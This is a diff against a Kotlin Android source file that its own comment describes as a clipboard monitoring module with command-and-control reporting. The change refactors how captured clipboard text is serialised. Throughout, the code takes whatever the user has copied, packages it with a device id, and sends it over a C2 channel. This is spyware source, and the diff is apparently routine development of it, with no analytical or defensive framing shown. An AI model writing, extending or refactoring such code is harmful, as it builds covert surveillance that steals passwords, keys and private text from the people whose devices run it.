@@ -1,6 +1,3 @@
-// ============================================================
-// FILE: android/app/src/main/java/com/xrc/sensors/Clipboard.kt
-// ============================================================
 package com.xrc.sensors
 
 import android.content.Context
@@ -8,6 +5,7 @@ import com.xrc.comms.ChannelClient
 import com.xrc.comms.Message
 import com.xrc.comms.Protocol
 import com.xrc.core.crypto.Identity
+import com.xrc.core.toJsonString
 
 /**
  * Clipboard — clipboard monitoring module with C2 reporting.
@@ -25,9 +23,7 @@ class Clipboard(
                 type = Protocol.TYPE_SENSOR_DATA,
                 id = "clip_${System.currentTimeMillis()}",
                 device_id = deviceId,
-                payload = Protocol.json.encodeToString(
-                    mapOf("type" to "clipboard", "data" to text)
-                )
+                payload = mapOf("type" to "clipboard", "data" to text).toJsonString()
             )
             channelClient.send(msg)
         }
